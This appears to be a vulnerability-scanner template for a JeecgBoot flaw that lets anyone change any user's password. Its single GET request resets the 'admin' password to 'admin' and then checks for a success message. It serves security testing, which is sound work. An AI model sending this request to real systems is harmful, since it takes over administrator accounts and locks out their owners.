id: jeecgboot-passwordchange-anyuser-password-reset
info:
  name: JeecgBoot Arbitrary User Password Reset Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: access-control
  description: |
    Exploits a password reset vulnerability in JeecgBoot allowing arbitrary user password changes.
  reference: []

http:
  - method: GET
    path:
      - "{{BaseURL}}/jeecg-boot/sys/user/passwordChange?username=admin&password=admin&smscode=&phone="
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"success":true'
          - '密码修改完成'
      - type: word
        part: header
        words:
          - "application/json"
      - type: word
        part: body
        negative: true
        words:
          - "<"
